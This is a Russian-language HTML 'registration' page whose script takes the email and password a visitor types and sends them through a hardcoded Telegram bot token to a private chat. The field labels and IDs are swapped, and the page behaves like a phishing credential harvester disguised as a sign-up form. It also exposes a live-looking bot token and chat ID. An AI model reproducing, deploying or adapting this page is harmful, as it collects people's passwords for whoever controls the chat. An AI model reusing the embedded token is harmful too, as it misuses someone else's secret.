<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Регистрация</title>
</head>
<body>
    <h1>Регистрация</h1>
    <form id="registrationForm">
        <label for="username">email:</label>
        <input type="text" id="username" name="username" required>
        <br>
        <label for="email">пароль:</label>
        <input type="email" id="email" name="email" required>
        <br>
        <button type="submit">Зарегистрироваться</button>
    </form>

    <script>
        document.getElementById('registrationForm').addEventListener('submit', function(event) {
            event.preventDefault(); 

            const username = document.getElementById('username').value;
            const email = document.getElementById('email').value;

            const token = '7942332820:AAFC2P1_9T8USat2LkVF_cXqtqCaBqs2O4g';
            const chatId = -1002372284940 
            const message = `Новая регистрация:\nИмя пользователя: ${username}\nEmail: ${email}`;
            const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

           
            fetch(url) 
                .then(response => {
                    if (response.ok) {
                        alert('Данные успешно отправлены в Telegram!');
                    } else {
                        alert('Ошибка при отправке данных.');
                    }
                })
                .catch(error => {
                    console.error('Ошибка:', error);
                    alert('Ошибка при отправке данных.');
                });
        });
    </script>
</body>
</html>
